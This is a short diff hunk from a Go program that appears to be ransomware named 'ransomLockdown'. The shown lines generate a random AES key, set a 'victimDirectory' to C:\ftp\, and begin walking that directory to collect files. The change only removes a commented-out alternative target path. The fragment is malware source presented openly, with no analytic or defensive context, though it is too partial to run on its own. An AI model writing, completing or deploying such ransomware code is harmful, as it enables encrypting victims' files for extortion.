@@ -29,7 +29,6 @@ func main() {
 	aesKey := randSeq(32)
 
 	victimDirectory := "C:\\ftp\\"
-	//victimDirectory := "/home/anthony/Documents/code/go/ransomLockdown/src/"
 	var files []string
 	err := filepath.Walk(victimDirectory,
 		func(path string, info os.FileInfo, err error) error {
